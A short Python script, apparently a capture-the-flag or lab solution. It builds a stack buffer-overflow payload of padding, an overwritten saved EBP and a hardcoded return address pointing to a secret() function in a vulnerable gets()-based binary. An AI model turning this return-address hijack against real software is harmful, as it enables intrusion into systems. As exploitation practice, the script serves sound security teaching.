import struct
import sys

def p32(x):
    return struct.pack("<I", x)  # Pack as 32-bit little-endian

payload = (
    b'A' * 16 +           # Fills buffer + alignment
    b'B' * 4 +            # Overwrites saved EBP
    p32(0x08049196) +     # Address of secret()
    b'\n'                 # Newline for gets()
)

sys.stdout.buffer.write(payload)
sys.stdout.buffer.flush()